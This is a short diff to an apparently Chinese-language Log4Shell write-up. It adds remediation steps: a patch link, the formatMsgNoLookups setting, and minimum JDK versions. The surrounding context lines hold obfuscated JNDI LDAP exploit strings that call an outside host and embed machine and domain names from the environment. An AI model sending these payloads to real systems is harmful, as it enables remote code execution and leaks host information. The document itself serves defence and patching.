@@ -208,6 +208,18 @@ ${${upper::-j}${upper::-n}${::-d}${upper::-i}:${upper::-l}${upper::-d}${upper::-
 
 ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk
 ```
+## 修复方案
+
+截止到目前，网上的修复方法大致是这些：
+
+补丁链接:
+[log4j-2.15.0-rc2](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2)
+
+1）添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true；
+
+2）在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；
+
+3）JDK使用11.0.1、8u191、7u201、6u211及以上的高版本；
 
 ## BurpSuite主动/被动扫描插件
 
